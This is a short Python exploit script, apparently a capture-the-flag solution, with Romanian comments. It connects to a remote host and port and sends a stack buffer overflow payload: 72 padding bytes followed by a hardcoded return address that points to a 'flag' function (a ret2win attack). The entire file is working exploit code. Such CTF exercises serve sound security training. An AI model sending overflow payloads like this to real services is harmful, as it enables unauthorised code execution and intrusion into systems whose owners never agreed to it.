#!/usr/bin/env python3

import socket
import argparse
import struct

parseobj = argparse.ArgumentParser()
parseobj.add_argument(
	"host",
	type=str,
	help="hostname/ip",
	)

parseobj.add_argument(
	"port",
	type=int,
	help="port number",
	)

args = parseobj.parse_args()

win_address = struct.pack("<Q",0x40123b) # adresa functiei flag obtinuta din comanda inf function din gef

offset = 72 #numar determinat din incercari repetate de a transmite cate 1 byte in plus la program pana incepe rescrierea adresei de interes
payload_to_send = b"".join([b'a'*offset,win_address])
payload_to_send += b"\n"
with socket.socket() as connection:
	connection.connect((args.host,args.port))
	print(connection.recv(4096).decode("utf-8"))
	connection.send(payload_to_send)
	print(connection.recv(4096).decode("utf-8"))
	print(connection.recv(4096).decode("utf-8"))